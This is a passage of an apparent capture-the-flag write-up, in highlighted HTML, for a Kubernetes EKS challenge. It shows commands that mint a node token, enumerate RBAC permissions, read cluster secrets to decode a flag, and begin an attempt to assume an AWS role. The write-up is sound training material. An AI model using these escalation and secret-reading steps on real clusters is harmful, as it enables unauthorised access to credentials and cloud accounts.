#ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"kind\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"ExecCredential\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"apiVersion\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"client.authentication.k8s.io/v1beta1\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"spec\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{},\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"status\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"expirationTimestamp\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-11-03T03:38:10Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"token\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYX\u0026#x3C;*REDACTED*\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis gets us a token, so lets try to use it:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eexport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eTOKEN=$(\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e eks get-token \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--cluster-name\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e eks-challenge-cluster\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ejq\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e '.status.token' \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-r\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e)\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--token\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e$TOKEN\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eauth\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ecan-i\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--list\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003ewarning:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ethe\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003elist\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003emay\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ebe\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eincomplete:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ewebhook\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eauthorizer\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003edoes\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003enot\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esupport\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003euser\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003erule\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eresolution\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eResources\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                       \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eNon-Resource\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eURLs\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eResource\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eNames\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e     \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eVerbs\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eserviceaccounts/token\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                           []                  [debug-sa]         [create]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eselfsubjectaccessreviews.authorization.k8s.io\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e   []                  []                 [create]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eselfsubjectrulesreviews.authorization.k8s.io\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    []                  []                 [create]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003epods\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                            []                  []                 [get list]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003esecrets\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                         []                  []                 [get list]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eserviceaccounts\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                 []                  []                 [get list]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/api/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/api]              []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/apis/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]           []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/apis]             []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/healthz]          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/healthz]          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/livez]            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/livez]            []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/openapi/\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e*\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e]        []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/openapi]          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/readyz]           []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/readyz]           []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version/]         []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version/]         []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version]          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                                                [/version]          []                 [get]\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003epodsecuritypolicies.policy\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                      []                  [eks.privileged]   [use]\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ePerfect!  We have more access which includes fetching secrets:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--token\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e$TOKEN\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esecret\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-o\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ejson\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"apiVersion\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"v1\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"items\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e [\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        {\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"apiVersion\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"v1\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"data\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"flag\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3\u0026#x3C;*REDACTED*\u003e=\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"kind\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"Secret\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"metadata\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"creationTimestamp\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"2023-11-01T12:27:57Z\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"name\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"node-flag\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"namespace\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"challenge4\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"resourceVersion\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"883574\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e                \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"uid\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"26461a29-ec72-40e1-adc7-99128ce664f7\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            },\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e            \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"type\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"Opaque\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    ],\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"kind\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"List\",\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"metadata\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e{\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e        \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003e\"resourceVersion\"\u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e:\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"\"\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #ADBAC7\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo we just need to base64 decode that and we are on to the next challenge!\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e--token\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e$TOKEN\u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e\"\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eget\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003esecret\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-o\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ejson\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ejq\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003e'.items[0].data.flag'\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-r\u003c/span\u003e\u003cspan style=\"color: #F47067\"\u003e|\u003c/span\u003e\u003cspan style=\"color: #F69D50\"\u003ebase64\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #6CB6FF\"\u003e-d\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003ewiz_eks_challenge\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e{only_a_real_pro_can_navigate_\u0026#x3C;*REDACTED*\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1\u003eChallenge 5\u003c/h1\u003e\n\u003cp\u003eThe hint:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"\u003e\u003ccode data-language=\"\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eYou've successfully transitioned from a limited Service Account to a Node\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eService Account! Great job. Your next challenge is to move from the EKS to the\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eAWS account.\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #adbac7\"\u003eCan you acquire the AWS role of the s3access-sa service account, and get the flag?\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo lets start with checking what access we do have:\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ekubectl\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003ewhoami\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003esystem:node:challenge:ip-192-168-21-50.us-west-1.compute.internal\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCan we list buckets?\u003c/p\u003e\n\u003cdiv data-rehype-pretty-code-fragment=\"\"\u003e\u003cpre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"\u003e\u003ccode data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"\u003e\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003e❯\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eaws\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003es3\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003els\u003c/span\u003e\u003c/span\u003e\n\u003cspan data-line=\"\"\u003e \u003c/span\u003e\n\u003cspan data-line=\"\"\u003e\u003cspan style=\"color: #F69D50\"\u003eAn\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eerror\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e \u003c/span\u003e\u003cspan style=\"color: #96D0FF\"\u003eoccurred\u003c/span\u003e\u003cspan style=\"color: #ADBAC7\"\u003e (AccessDenied) when calling the ListBuckets operation: Access Denied\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNope!  So we need to figure out how to become the \u003ccode\u003es3access-sa\u003c/code\u003e. What access do\nwe 